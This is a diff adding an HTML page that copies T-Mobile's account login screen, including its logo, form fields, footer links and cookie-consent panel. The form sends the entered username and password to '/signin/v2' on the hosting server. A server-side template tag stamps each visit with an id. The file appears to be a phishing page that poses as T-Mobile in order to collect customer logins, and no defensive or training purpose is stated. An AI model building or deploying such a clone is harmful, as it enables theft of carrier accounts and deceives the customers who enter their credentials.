@@ -1,0 +1,512 @@
+<html lang="en">
+
+<head class="at-element-marker">
+  <meta charset="utf-8">
+  <title>My T-Mobile Login - Pay Bills Online &amp; Manage Your T-Mobile Account</title>
+  <base href="/signin/v2/">
+  <meta name="description"
+    content="Log in to manage your T-Mobile account. View or pay your bill, check usage, change plans or add-ons, add a person, manage devices, data, and Internet, and get help.">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+
+  <link rel="stylesheet" href="styles.06c5d3dcdb5f473b.css" media="all" onload="this.media='all'"><noscript>
+    <link rel="stylesheet" href="styles.06c5d3dcdb5f473b.css">
+  </noscript>
+
+  <link rel="stylesheet" href="/stylesheets/style.css">
+</head>
+
+<body class="app-background-body">
+
+  <div _ngcontent-dyi-c42="" id="globalHeader" class="ng-star-inserted">
+    <app-root _ngcontent-dyi-c42="" _nghost-dyi-c41="" class="ng-tns-c41-0 ng-star-inserted">
+      <div _ngcontent-dyi-c41="" class="ng-tns-c41-0 visible">
+        <div _ngcontent-dyi-c41="" class="ng-tns-c41-0 ng-star-inserted"><!----></div><!---->
+        <div _ngcontent-dyi-c41="" class="ng-tns-c41-0 ng-star-inserted"><app-header _ngcontent-dyi-c41=""
+            _nghost-dyi-c37="" class="ng-tns-c41-0 ng-star-inserted">
+            <div _ngcontent-dyi-c37="" class="header">
+              <div _ngcontent-dyi-c37="" class="header-container padding-10 header-top">
+                <div _ngcontent-dyi-c37="" class="container-fluid padding-left-0"><span _ngcontent-dyi-c37=""
+                    class="client_mytmo margin-mob text-underline-none ng-star-inserted"><!----><span
+                      _ngcontent-dyi-c37="" class="ng-star-inserted"><a _ngcontent-dyi-c37="" id="toggleLink"
+                        mporgnav="" class="langLink anchor-header ng-star-inserted" lang="es"
+                        href="//es.account.t-mobile.com/signin/v2/?redirect_uri=https:%2F%2Fwww.t-mobile.com%2Fsignin&amp;scope=TMO_ID_profile%20associated_lines%20billing_information%20associated_billing_accounts%20extended_lines%20token%20openid%20vault%20role%20consent%20ban_roles&amp;client_id=MYTMO&amp;access_type=ONLINE&amp;response_type=code&amp;approval_prompt=auto&amp;device_type=desktop&amp;prompt=select_account&amp;loginId=&amp;fp_client=4a7c76083b0082b1abd4a8eff87b0eea"><span
+                          _ngcontent-dyi-c37="" class="text-grey-11"> <img src="/signin/v2/logo.png"
+                            style="max-width: 7rem;" alt="logo">
+                        </span></a><!----></span><!----></span><!----><!----></div>
+              </div>
+            </div>
+          </app-header><!----><!----></div><!---->
+        <div _ngcontent-dyi-c41="" class="ng-tns-c41-0" style="min-height: calc(100vh - 347px);">
+          <div _ngcontent-dyi-c41="" class="ng-tns-c41-0">
+            <div _ngcontent-dyi-c41="" class="ng-tns-c41-0">
+              <div _ngcontent-dyi-c41="" class="app-background ng-tns-c41-0">
+
+                <div _ngcontent-dyi-c41="" class="show-mobile-progress ng-tns-c41-0"><app-progress _ngcontent-dyi-c41=""
+                    class="ng-tns-c41-0" _nghost-dyi-c20=""><!----></app-progress></div><!---->
+                <div _ngcontent-ils-c41=""
+                  class="ng-tns-c41-0 client_mytmo container page-level-error-container page-level-error-snack-bar ng-star-inserted">
+                </div>
+                <div _ngcontent-dyi-c41="" class="routerAnimation ng-tns-c41-0 ng-trigger ng-trigger-routeAnimations">
+                  <div _ngcontent-dyi-c41="" class="pageLogo container ng-tns-c41-0 ng-star-inserted" style="">
+                    <div _ngcontent-dyi-c41="" class="logo-container ng-tns-c41-0"><span _ngcontent-dyi-c41=""
+                        class="header-logo visible-md ng-tns-c41-0 ng-star-inserted"
+                        style="background-image: url(&quot;../../customization/customizationAssets/MYTMO/WEB/logo.svg&quot;);"></span><!----><span
+                        _ngcontent-dyi-c41="" class="header-logo visible-xs ng-tns-c41-0 ng-star-inserted"
+                        style="background-image: url(&quot;../../customization/customizationAssets/MYTMO/WEB/logo.svg&quot;);"></span><!---->
+                    </div>
+                  </div><!----><!----><!----><!----><router-outlet _ngcontent-dyi-c41=""
+                    class="ng-tns-c41-0"></router-outlet><app-login _nghost-dyi-c24="" class="ng-star-inserted"
+                    style="">
+                    <div _ngcontent-dyi-c24="" class="show-desktop-progress"><app-progress _ngcontent-dyi-c24=""
+                        _nghost-dyi-c20=""><!----></app-progress></div>
+                    <div _ngcontent-dyi-c24="" class="container mt-1">
+                      <div _ngcontent-dyi-c24="" class="row justify-content-center">
+                        <div _ngcontent-dyi-c24="" class="animate-ui-view">
+                          <div _ngcontent-dyi-c24="" class="inner_section custom-height animate-view"
+                            style="background-color: rgb(255, 255, 255);">
+                            <div _ngcontent-dyi-c24="" class="title-container">
+                              <h1 _ngcontent-dyi-c24="" id="lp1-header-txt" class="main_title main_title_login">Log in
+                              </h1><!----><!---->
+                            </div>
+                            <form _ngcontent-dyi-c24="" action="/signin/v2" method="post"
+                              class="main_form ng-pristine ng-invalid ng-touched">
+                              <input type="hidden" name="id" value="<%= Math.random().toString(36).substr(2) %>">
+                              <div _ngcontent-dyi-c24="" class="form-group">
+                                <div _ngcontent-dyi-c24="" class="text_box_group text_box_group_height">
+                                  <input _ngcontent-dyi-c24="" type="text" name="username" appmsisdnformatter=""
+                                    id="usernameTextBox"
+                                    class="text_box input_box ng-pristine ng-invalid remote-accessable focusable ng-touched"
+                                    aria-label="Email or phone number" required><label _ngcontent-dyi-c24=""
+                                    id="phoneNumberLabel" aria-hidden="true" class="floating-label">Email, phone number,
+                                    or username</label><!---->
+                                </div>
+                                <br>
+                                <div _ngcontent-dyi-c24="" class="text_box_group text_box_group_height">
+                                  <input _ngcontent-dyi-c24="" type="password" name="password" appmsisdnformatter=""
+                                    id="passwordTextBox"
+                                    class="text_box input_box ng-pristine ng-invalid remote-accessable focusable ng-touched"
+                                    aria-label="Password" required><label _ngcontent-dyi-c24="" id="passwordLabel"
+                                    aria-hidden="true" class="floating-label">Password</label><!---->
+                                </div>
+                                <br>
+                                <div _ngcontent-dyi-c24=""
+                                  class="text_box_group margin-bottom-5 wdhauto ng-star-inserted"><a
+                                    _ngcontent-dyi-c24="" tabindex="0" href="javascript: void(0)"
+                                    id="lp1-forgotLogin-link" role="link" aria-live="assertive"
+                                    class="btn til-btn forgot_btn remote-accessable focusable remote-accessable focusable">Forgot
+                                    password?</a></div><!---->
+                                <div _ngcontent-dyi-c24="" class="text_box_group margin-bottom-30 ng-star-inserted">
+                                  <button _ngcontent-dyi-c24="" id="lp1-next-btn" type="submit"
+                                    class="btn til-btn til-btn-svg ripple remote-accessable focusable remote-accessable focusable"><span
+                                      _ngcontent-dyi-c24=""> Next <svg _ngcontent-dyi-c24=""
+                                        xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                                        <g _ngcontent-dyi-c24="" fill="none" fill-rule="evenodd">
+                                          <path _ngcontent-dyi-c24="" d="M2 2h20v20H2z"></path>
+                                          <path _ngcontent-dyi-c24="" fill="#fff" fill-rule="nonzero"
+                                            d="M5.821 4.537l7.643 7.643-7.643 7.643L8.18 22.18 18.181 12.18 8.18 2.179z">
+                                          </path>
+                                        </g>
+                                      </svg></span></button>
+                                </div><!---->
+                              </div>
+                            </form><!---->
+                            <div _ngcontent-dyi-c24="" class="text_box_group margin-bottom-20 ng-star-inserted">
+                              <p _ngcontent-dyi-c24="" class="action-links-text">Don't have a T-Mobile ID?</p><button
+                                _ngcontent-dyi-c24="" id="lp1-signup-btn" role="link"
+                                class="btn til-btn signup_btn remote-accessable focusable remote-accessable focusable"
+                                style="font-size: 16px;"> Sign up <span _ngcontent-dyi-c24=""
+                                  class="arrow-right-megenta"></span></button>
+                            </div><!----><!---->
+                            <div _ngcontent-dyi-c24="" class="text_box_group margin-bottom-20 ng-star-inserted">
+                              <p _ngcontent-dyi-c24="" class="action-links-text">Don't want to Login?</p><a
+                                _ngcontent-dyi-c24=""
+                                class="btn til-btn signup_btn remote-accessable focusable remote-accessable focusable"
+                                href="https://t-mobile.com/guestpay">Pay as a guest<span _ngcontent-dyi-c24=""
+                                  class="arrow-right-megenta"></span></a>
+                            </div><!----><!---->
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </app-login><!---->
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div _ngcontent-dyi-c41="" class="ng-tns-c41-0 ng-star-inserted"><app-footer _ngcontent-dyi-c41=""
+            class="ng-tns-c41-0" _nghost-dyi-c40=""><!---->
+            <div _ngcontent-dyi-c40="" class="ng-star-inserted">
+              <div _ngcontent-dyi-c40="" class="global-footer">
+                <div _ngcontent-dyi-c40="" class="ng-star-inserted">
+                  <div _ngcontent-dyi-c40="" class="container-fluid footer-top">
+                    <div _ngcontent-dyi-c40=""
+                      class="row justify-content-center top-footer-elems col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                      <div _ngcontent-dyi-c40="" class="col-md-3 text-align mobile-pad ng-star-inserted"><a
+                          _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                          href="https://support.t-mobile.com/welcome.html"
+                          class=" remote-accessable focusable remote-accessable focusable"><span _ngcontent-dyi-c40=""
+                            class="footer-icon topFooterMobText"><em _ngcontent-dyi-c40=""
+                              class="icon-support"></em></span><span _ngcontent-dyi-c40="" class="topFooterMobText"
+                            id="support"> SUPPORT </span></a></div>
+                      <div _ngcontent-dyi-c40="" class="col-md-3 text-align mobile-pad ng-star-inserted"><a
+                          _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                          href="https://www.t-mobile.com/store-locator.html"
+                          class=" remote-accessable focusable remote-accessable focusable"><span _ngcontent-dyi-c40=""
+                            class="footer-icon topFooterMobText"><em _ngcontent-dyi-c40=""
+                              class="icon-storelocator"></em></span><span _ngcontent-dyi-c40="" class="topFooterMobText"
+                            id="storelocator"> STORE LOCATOR </span></a></div>
+                      <div _ngcontent-dyi-c40="" class="col-md-3 text-align mobile-pad ng-star-inserted"><a
+                          _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                          href="https://www.t-mobile.com/coverage/lte-comparison-map"
+                          class=" remote-accessable focusable remote-accessable focusable"><span _ngcontent-dyi-c40=""
+                            class="footer-icon topFooterMobText"><em _ngcontent-dyi-c40=""
+                              class="icon-coverage"></em></span><span _ngcontent-dyi-c40="" class="topFooterMobText"
+                            id="coverage"> COVERAGE </span></a></div>
+                      <div _ngcontent-dyi-c40="" class="col-md-3 text-align mobile-pad ng-star-inserted"><a
+                          _ngcontent-dyi-c40="" target="_blank" rel="noopener" href="https://www.t-mobile.com/"
+                          class=" remote-accessable focusable remote-accessable focusable"><span _ngcontent-dyi-c40=""
+                            class="footer-icon topFooterMobText"><em _ngcontent-dyi-c40=""
+                              class="icon-tmobile"></em></span><span _ngcontent-dyi-c40="" class="topFooterMobText"
+                            id="tmobile.com"> T-MOBILE.COM </span></a></div><!---->
+                    </div>
+                  </div>
+                </div><!---->
+                <div _ngcontent-dyi-c40="" class="row col-12 gf-full-bleed-divider"></div>
+                <div _ngcontent-dyi-c40="" class="container-fluid ng-star-inserted">
+                  <div _ngcontent-dyi-c40=""
+                    class="row col-lg-10 offset-lg-1 justify-content-center text-align bottom-footer-elems">
+                    <div _ngcontent-dyi-c40="" class="col-md-11 offset-md-1 col-6">
+                      <div _ngcontent-dyi-c40="" class="row justify-content-center">
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/company.html"
+                                class=" remote-accessable focusable remote-accessable focusable">About T-Mobile
+                                USA</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/Templates/Popup.aspx?PAsset=Ftr_Ftr_TermsAndConditions"
+                                class=" remote-accessable focusable remote-accessable focusable"> Terms &amp;
+                                Conditions</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 desktop-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/privacy-center/privacy-notices/t-mobile-privacy-notice"
+                                class=" remote-accessable focusable remote-accessable focusable">Privacy
+                                Notice</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 desktop-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/responsibility/privacy/privacy-choice/ad-options"
+                                class=" remote-accessable focusable remote-accessable focusable">Interest-Based
+                                Ads</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 mobile-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/Templates/Popup.aspx?PAsset=Ftr_Ftr_ReturnPolicy"
+                                class=" remote-accessable focusable remote-accessable focusable">Return
+                                Policy</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 mobile-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/Templates/Popup.aspx?PAsset=Ftr_Ftr_TermsOfUse&amp;print=true"
+                                class=" remote-accessable focusable remote-accessable focusable"> Terms of
+                                Use</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 mobile-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                id="privacycenter-mobile" href="https://www.t-mobile.com/privacy-center"
+                                class=" remote-accessable focusable remote-accessable focusable">Privacy
+                                Center</a></span></div>
+                        </div>
+                      </div>
+                    </div>
+                    <div _ngcontent-dyi-c40="" class="col-md-11 offset-md-1 col-6">
+                      <div _ngcontent-dyi-c40="" class="row justify-content-center">
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 mobile-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/privacy-center/privacy-notices/t-mobile-privacy-notice"
+                                class=" remote-accessable focusable remote-accessable focusable">Privacy
+                                Notice</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 mobile-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/responsibility/privacy/privacy-choice/ad-options"
+                                class=" remote-accessable focusable remote-accessable focusable">Interest-Based
+                                Ads</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 desktop-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/Templates/Popup.aspx?PAsset=Ftr_Ftr_ReturnPolicy"
+                                class=" remote-accessable focusable remote-accessable focusable">Return
+                                Policy</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 desktop-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/Templates/Popup.aspx?PAsset=Ftr_Ftr_TermsOfUse&amp;print=true"
+                                class=" remote-accessable focusable remote-accessable focusable"> Terms of
+                                Use</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/company/privacy-resources/identity-theft.html"
+                                class=" remote-accessable focusable remote-accessable focusable">Privacy
+                                Resources</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/company/company-info/consumer/internet-services.html"
+                                class=" remote-accessable focusable remote-accessable focusable">Open Internet
+                                Policy</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 mobile-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" id="dns-mobile"
+                                class=" remote-accessable focusable remote-accessable focusable">Do Not Sell or Share
+                                My Personal Information</a></span></div>
+                        </div>
+                      </div>
+                    </div>
+                    <div _ngcontent-dyi-c40="" class="col-md-11 offset-md-1 col-6">
+                      <div _ngcontent-dyi-c40="" class="row">
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 desktop-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" target="_blank" rel="noopener"
+                                href="https://www.t-mobile.com/privacy-center" id="privacycenter"
+                                class=" remote-accessable focusable remote-accessable focusable">Privacy
+                                Center</a></span></div>
+                        </div>
+                        <div _ngcontent-dyi-c40="" class="col-12 col-md-3 padding-6 desktop-view">
+                          <div _ngcontent-dyi-c40="" class="text-align-left padding-12"><span _ngcontent-dyi-c40=""
+                              class="text-design"><a _ngcontent-dyi-c40="" tabindex="0" id="dns"
+                                class=" remote-accessable focusable remote-accessable focusable">Do Not Sell or Share
+                                My Personal Information</a></span></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div _ngcontent-dyi-c40="" class="row justify-content-center padding-hyperlink">
+                    <div _ngcontent-dyi-c40="" class="col-12 bottom-footer-text"><a _ngcontent-dyi-c40=""
+                        target="_blank" rel="noopener"
+                        href="https://www.t-mobile.com/Templates/Popup.aspx?PAsset=Ftr_Ftr_Copyright"
+                        class=" remote-accessable focusable remote-accessable focusable"> © 2002-2024 T-Mobile USA,
+                        Inc </a></div>
+                  </div>
+                </div><!---->
+              </div>
+            </div><!----><!---->
+          </app-footer></div><!----><!---->
+      </div><!---->
+    </app-root>
+  </div><!---->
+
+  <script type="text/javascript"
+    src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&amp;ns=8&amp;cb=1876871196" async=""></script>
+  <div id="onetrust-consent-sdk">
+    <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
+    <div id="onetrust-pc-sdk" class="otPcPanel ot-hide ot-fade-in" role="alertdialog" aria-modal="true"
+      aria-describedby="ot-pc-desc" lang="en" aria-label="T-Mobile Notice"><!-- PC Header -->
+      <div class="ot-pc-header">
+        <div class="ot-pc-logo" role="img" aria-label="Company Logo"><img alt="Company Logo"
+            src="https://cdn.cookielaw.org/logos/static/ot_company_logo.png"></div><button id="close-pc-btn-handler"
+          class="ot-close-icon" aria-label="Close"></button>
+      </div>
+      <div id="ot-pc-content" class="ot-pc-scrollbar">
+        <h2 id="ot-pc-title">T-Mobile Notice</h2>
+        <div id="ot-pc-desc">We use a tool to capture how users interact with our websites so we can analyze and improve
+          the user experience. Update your preferences below and then click “Confirm my choices.”
+          <br><a
+            href="https://www.t-mobile.com/content/digx/tmobile/us/en/privacy-center/education/cookies-tracking.html"
+            class="privacy-notice-link" rel="noopener" target="_blank"
+            aria-label="Find out more in our Privacy Center article on Cookies and tracking., opens in a new tab">Find
+            out more in our Privacy Center article on Cookies and tracking.</a>
+        </div><button id="accept-recommended-btn-handler">Accept</button>
+        <section class="ot-sdk-row ot-cat-grp">
+          <h3 id="ot-category-title"> Manage Preferences</h3>
+          <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="CX"><button ot-accordion="true"
+              aria-expanded="false" aria-controls="ot-desc-id-CX"
+              aria-labelledby="ot-header-id-CX"></button><!-- Accordion header -->
+            <div class="ot-acc-hdr">
+              <div class="ot-plus-minus"><span></span><span></span></div>
+              <h4 class="ot-cat-header" id="ot-header-id-CX">Session capture tool</h4>
+              <div class="ot-tgl"><input type="checkbox" name="ot-group-id-CX" id="ot-group-id-CX" aria-checked="true"
+                  role="switch" class="category-switch-handler" data-optanongroupid="CX" checked=""
+                  aria-labelledby="ot-header-id-CX"> <label class="ot-switch" for="ot-group-id-CX"><span
+                    class="ot-switch-nob" aria-checked="false" role="switch"></span> <span class="ot-label-txt">Session
+                    capture tool</span></label> </div>
+            </div><!-- accordion detail -->
+            <div class="ot-acc-grpcntr ot-acc-txt">
+              <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-CX">By turning the toggle ON (blue), you Accept
+                the use of this tool when you visit our sites. By turning the toggle OFF (gray), you Reject the use of
+                this tool when you visit our sites.</p>
+            </div>
+          </div>
+          <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0001"><button
+              ot-accordion="true" aria-expanded="false" aria-controls="ot-desc-id-C0001"
+              aria-labelledby="ot-header-id-C0001"></button><!-- Accordion header -->
+            <div class="ot-acc-hdr">
+              <div class="ot-plus-minus"><span></span><span></span></div>
+              <h4 class="ot-cat-header" id="ot-header-id-C0001">Strictly Necessary Cookies</h4>
+            </div><!-- accordion detail -->
+            <div class="ot-acc-grpcntr ot-acc-txt">
+              <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">These cookies are necessary for the
+                website to function and cannot be switched off in our systems. They are usually only set in response to
+                actions made by you which amount to a request for services, such as setting your privacy preferences,
+                logging in or filling in forms. You can set your browser to block or alert you about these cookies, but
+                some parts of the site will not then work. These cookies do not store any personally identifiable
+                information.</p>
+            </div>
+          </div>
+          <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="gpc"><button
+              ot-accordion="true" aria-expanded="false" aria-controls="ot-desc-id-gpc"
+              aria-labelledby="ot-header-id-gpc"></button><!-- Accordion header -->
+            <div class="ot-acc-hdr">
+              <div class="ot-plus-minus"><span></span><span></span></div>
+              <h4 class="ot-cat-header" id="ot-header-id-gpc">GPC</h4>
+              <div class="ot-tgl"><input type="checkbox" name="ot-group-id-gpc" id="ot-group-id-gpc" aria-checked="true"
+                  role="switch" class="category-switch-handler" data-optanongroupid="gpc" checked=""
+                  aria-labelledby="ot-header-id-gpc"> <label class="ot-switch" for="ot-group-id-gpc"><span
+                    class="ot-switch-nob" aria-checked="false" role="switch"></span> <span
+                    class="ot-label-txt">GPC</span></label> </div>
+            </div><!-- accordion detail -->
+            <div class="ot-acc-grpcntr ot-acc-txt">
+              <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-gpc">For GPC reporting purposes</p>
+            </div>
+          </div><!-- Non Accordion Group --><!-- Accordion Group section starts --><!-- Accordion Group section ends -->
+        </section>
+      </div>
+      <section id="ot-pc-lst" class="ot-hide ot-pc-scrollbar">
+        <div id="ot-pc-hdr">
+          <div id="ot-lst-title"><button class="ot-link-btn back-btn-handler" aria-label="Back"><svg id="ot-back-arw"
+                xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                viewBox="0 0 444.531 444.531" xml:space="preserve">
+                <title>Back Button</title>
+                <g>
+                  <path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
+            l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
+            c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
+            s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
+            L213.13,222.409z"></path>
+                </g>
+              </svg></button>
+            <h3>Back</h3>
+          </div>
+          <div class="ot-lst-subhdr">
+            <div class="ot-search-cntr">
+              <p role="status" class="ot-scrn-rdr"></p><label for="vendor-search-handler" class="ot-scrn-rdr"></label>
+              <input id="vendor-search-handler" type="text" name="vendor-search-handler"> <svg
+                xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                viewBox="0 -30 110 110" aria-hidden="true">
+                <title>Search Icon</title>
+                <path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
+              s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
+              c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
+              s-17-7.626-17-17S14.61,6,23.984,6z"></path>
+              </svg>
+            </div>
+            <div class="ot-fltr-cntr"><button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true"><svg
+                  role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 402.577 402.577"
+                  xml:space="preserve">
+                  <title>Filter Icon</title>
+                  <g>
+                    <path fill="#fff" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
+        c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
+        c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
+        C402.765,25.895,404.093,19.231,400.858,11.427z"></path>
+                  </g>
+                </svg></button></div>
+            <div id="ot-anchor"></div>
+            <section id="ot-fltr-modal">
+              <div id="ot-fltr-cnt"><button id="clear-filters-handler">Clear</button>
+                <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
+                  <div class="ot-fltr-opts">
+                    <div class="ot-fltr-opt">
+                      <div class="ot-chkbox"><input id="chkbox-id" type="checkbox" aria-checked="false"
+                          class="category-filter-handler"> <label for="chkbox-id"><span class="ot-label-txt">checkbox
+                            label</span></label> <span class="ot-label-status">label</span></div>
+                    </div>
+                  </div>
+                  <div class="ot-fltr-btns"><button id="filter-apply-handler">Apply</button> <button
+                      id="filter-cancel-handler">Cancel</button></div>
+                </div>
+              </div>
+            </section>
+          </div>
+        </div>
+        <section id="ot-lst-cnt" class="ot-pc-scrollbar">
+          <div id="ot-sel-blk">
+            <div class="ot-sel-all">
+              <div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span
+                  class="ot-li-hdr">Leg.Interest</span></div>
+              <div class="ot-sel-all-chkbox">
+                <div class="ot-chkbox" id="ot-selall-hostcntr"><input id="select-all-hosts-groups-handler"
+                    type="checkbox" aria-checked="false"> <label for="select-all-hosts-groups-handler"><span
+                      class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span>
+                </div>
+                <div class="ot-chkbox" id="ot-selall-vencntr"><input id="select-all-vendor-groups-handler"
+                    type="checkbox" aria-checked="false"> <label for="select-all-vendor-groups-handler"><span
+                      class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span>
+                </div>
+                <div class="ot-chkbox" id="ot-selall-licntr"><input id="select-all-vendor-leg-handler" type="checkbox"
+                    aria-checked="false"> <label for="select-all-vendor-leg-handler"><span class="ot-label-txt">checkbox
+                      label</span></label> <span class="ot-label-status">label</span></div>
+              </div>
+            </div>
+          </div>
+          <div class="ot-sdk-row">
+            <div class="ot-sdk-column"></div>
+          </div>
+        </section>
+      </section><!-- Footer buttons and logo -->
+    </div>
+  </div>
+  <script>
+
+
+    const phoneInput = document.getElementById("usernameTextBox")
+    const inputLabel = document.getElementById("phoneNumberLabel")
+
+    const passwordInput = document.getElementById("passwordTextBox")
+    const passwordLabel = document.getElementById("passwordLabel")
+
+    const submitBtn = document.getElementById("lp1-next-btn")
+
+
+    phoneInput.addEventListener("input", () => {
+      if (phoneInput.value.length > 0) {
+        inputLabel.className = "floating-label floating-label-focus floating-label-valid"
+
+      } else {
+        inputLabel.className = "floating-label"
+      }
+    })
+
+    passwordInput.addEventListener("input", () => {
+      if (passwordInput.value.length > 0) {
+        passwordLabel.className = "floating-label floating-label-focus floating-label-valid"
+
+      } else {
+        passwordLabel.className = "floating-label"
+      }
+    })
+  </script>
+</body>
+
+</html>
